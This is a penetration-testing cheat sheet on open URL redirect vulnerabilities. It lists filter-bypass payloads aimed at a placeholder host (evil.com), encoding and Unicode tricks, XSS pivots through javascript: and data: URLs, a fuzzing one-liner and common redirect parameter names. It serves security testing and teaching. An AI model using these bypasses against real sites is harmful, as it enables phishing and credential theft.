# Open URL Redirection

> Un-validated redirects and forwards are possible when a web application accepts untrusted input that could cause the web application to redirect the request to a URL contained within untrusted input. By modifying untrusted URL input to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials. Because the server name in the modified link is identical to the original site, phishing attempts may have a more trustworthy appearance. Un-validated redirect and forward attacks can also be used to maliciously craft a URL that would pass the application’s access control check and then forward the attacker to privileged functions that they would normally not be able to access.

## Summary

* [Labs](#labs)
* [Exploitation](#exploitation)
  * [HTTP Redirection Status Code](#http-redirection-status-code)
  * [Fuzzing](#fuzzing)
  * [Filter Bypass](#filter-bypass)
  * [Common injection parameters](#common-injection-parameters)
* [References](#references)


## Labs

* [Root Me - HTTP - Open redirect](https://www.root-me.org/fr/Challenges/Web-Serveur/HTTP-Open-redirect)
* [PortSwigger - DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection)


## Exploitation

An open redirect vulnerability occurs when a web application or server uses unvalidated, user-supplied input to redirect users to other sites. This can allow an attacker to craft a link to the vulnerable site which redirects to a malicious site of their choosing.

Attackers can leverage this vulnerability in phishing campaigns, session theft, or forcing a user to perform an action without their consent.

Consider this example:
Your web application has a feature that allows users to click on a link and be automatically redirected to a saved preferred homepage. This might be implemented like so:

```ps1
https://example.com/redirect?url=https://userpreferredsite.com
```

An attacker could exploit an open redirect here by replacing the `userpreferredsite.com` with a link to a malicious website. They could then distribute this link in a phishing email or on another website. When users click the link, they're taken to the malicious website.


## HTTP Redirection Status Code

HTTP Redirection status codes, those starting with 3, indicate that the client must take additional action to complete the request. Here are some of the most common ones:

- [300 Multiple Choices](https://httpstatuses.com/300) - This indicates that the request has more than one possible response. The client should choose one of them.
- [301 Moved Permanently](https://httpstatuses.com/301) - This means that the resource requested has been permanently moved to the URL given by the Location headers. All future requests should use the new URI.
- [302 Found](https://httpstatuses.com/302) - This response code means that the resource requested has been temporarily moved to the URL given by the Location headers. Unlike 301, it does not mean that the resource has been permanently moved, just that it is temporarily located somewhere else.
- [303 See Other](https://httpstatuses.com/303) - The server sends this response to direct the client to get the requested resource at another URI with a GET request.
- [304 Not Modified](https://httpstatuses.com/304) - This is used for caching purposes. It tells the client that the response has not been modified, so the client can continue to use the same cached version of the response.
- [305 Use Proxy](https://httpstatuses.com/305) -  The requested resource must be accessed through a proxy provided in the Location header. 
- [307 Temporary Redirect](https://httpstatuses.com/307) - This means that the resource requested has been temporarily moved to the URL given by the Location headers, and future requests should still use the original URI.
- [308 Permanent Redirect](https://httpstatuses.com/308) - This means the resource has been permanently moved to the URL given by the Location headers, and future requests should use the new URI. It is similar to 301 but does not allow the HTTP method to change.


## Fuzzing

Replace `www.whitelisteddomain.tld` from *Open-Redirect-payloads.txt* with a specific white listed domain in your test case

To do this simply modify the `WHITELISTEDDOMAIN` with value `www.test.com `to your test case URL.

```powershell
WHITELISTEDDOMAIN="www.test.com" && sed 's/www.whitelisteddomain.tld/'"$WHITELISTEDDOMAIN"'/' Open-Redirect-payloads.txt > Open-Redirect-payloads-burp-"$WHITELISTEDDOMAIN".txt && echo "$WHITELISTEDDOMAIN" | awk -F. '{print "https://"$0"."$NF}' >> Open-Redirect-payloads-burp-"$WHITELISTEDDOMAIN".txt
```


## Filter Bypass

### Whitelisted Domain

Using a whitelisted domain or keyword

```powershell
whitelisted.com.evil.com
whitelisted.comevil.com
evil.com.whitelisted.com
evil.comwhitelisted.com
whitelisted.com%2eevil.com
```

Using `?` or `#` or `@` or `°` or `//;@`

```powershell
whitelisted.com@evil.com
evil.com#whitelisted.com
evil.com?whitelisted.com
whitelisted.com/°evil.com
whitelisted.com//;@evil.com > whitelisted.com%3b@evil.com
```

Using Host/Split Unicode Normalization

```powershell
https://evil.c℀.example.com . ---> https://evil.ca/c.example.com
http://a.com／X.b.com
```

### Scheme 

Using `//` or `///` or `////` or `/////` or `\\` or `\` or `\/\/` or `/\/` or `\//`

```powershell
//google.com
///google.com
////google.com
/////google.com
\google.com
\\google.com
\/\/google.com
/\/google.com
```

Using `https:` or `https:`

```powershell
https:google.com
http:google.com
```

### URL Encoding

Using `%0d` or `%0a` or `%09` or `%0C` or `%00`

```powershell
/%0d/evil.com
/%0a/evil.com
/%09/evil.com
/%0c/evil.com
/%00/evil.com
```

### Dot Bypass

Using "%E3%80%82" to bypass "." blacklisted character

```powershell
google。com
//google%E3%80%82com
```

Using null byte "%00" to bypass blacklist filter

```powershell
//google%00.com
```

### Ip confusion

### Other

Using parameter pollution

```powershell
?next=whitelisted.com&next=google.com
```

Creating folder as their domain

```powershell
http://www.yoursite.com/http://www.theirsite.com/
http://www.yoursite.com/folder/www.folder.com
```

Using "?" characted, browser will translate it to "/?"

```powershell
http://www.yoursite.com?http://www.theirsite.com/
http://www.yoursite.com?folder/www.folder.com
```

XSS from Open URL - If it's in a JS variable

```powershell
";alert(0);//
```

XSS from data:// wrapper

```powershell
http://www.example.com/redirect.php?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==
```

XSS from javascript:// wrapper

```powershell
http://www.example.com/redirect.php?url=javascript:prompt(1)
```


## Open redirect to XSS

Using Script Pseudo-Protocols

```javascript
javascript:alert(1)
```


## Common injection parameters

```powershell
/{payload}
?next={payload}
?url={payload}
?target={payload}
?rurl={payload}
?dest={payload}
?destination={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
/redirect/{payload}
/cgi-bin/redirect.cgi?{payload}
/out/{payload}
/out?{payload}
?view={payload}
/login?to={payload}
?image_url={payload}
?go={payload}
?return={payload}
?returnTo={payload}
?return_to={payload}
?checkout_url={payload}
?continue={payload}
?return_path={payload}
```


## Reports

- https://hackerone.com/reports/400982
- https://hackerone.com/reports/158434
- https://hackerone.com/reports/103772

## References

- [Open-Redirect-Payloads - cujanovic](https://github.com/cujanovic/Open-Redirect-Payloads)
- [Host/Split Exploitable Antipatterns in Unicode Normalization - BlackHat US 2019](https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf)
- [Open Redirect Vulnerability - AUGUST 15, 2018 - s0cket7](https://s0cket7.com/open-redirect-vulnerability/)
- [OWASP - Unvalidated Redirects and Forwards Cheat Sheet](https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet)
- [Pentester Land - Open Redirect Cheat Sheet](https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html)
- [You do not need to run 80 reconnaissance tools to get access to user accounts - @stefanocoding](https://gist.github.com/stefanocoding/8cdc8acf5253725992432dedb1c9c781)
- https://gist.github.com/0xblackbird/d7677a05ea50586cf2be0a601e665d1a
- https://infosecwriteups.com/open-redirect-developers-are-lazy-or-maybe-busy-6c51718b10e4
